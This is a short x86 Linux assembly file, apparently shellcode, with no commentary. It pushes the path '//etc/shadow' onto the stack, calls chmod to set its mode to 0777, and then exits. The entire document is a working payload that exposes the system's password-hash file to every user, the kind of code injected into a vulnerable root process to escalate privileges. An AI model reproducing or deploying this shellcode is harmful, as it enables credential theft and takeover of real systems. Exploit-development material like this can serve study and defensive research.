global _start

section .text
_start:

	xor eax, eax
	push eax

	mov al, 0xf

	push 0x776f6461
	push 0x68732f63
	push 0x74652f2f

	mov ebx, esp

	xor ecx, ecx

	mov cx, 0x1ff

	int 0x80

	inc eax

	int 0x80
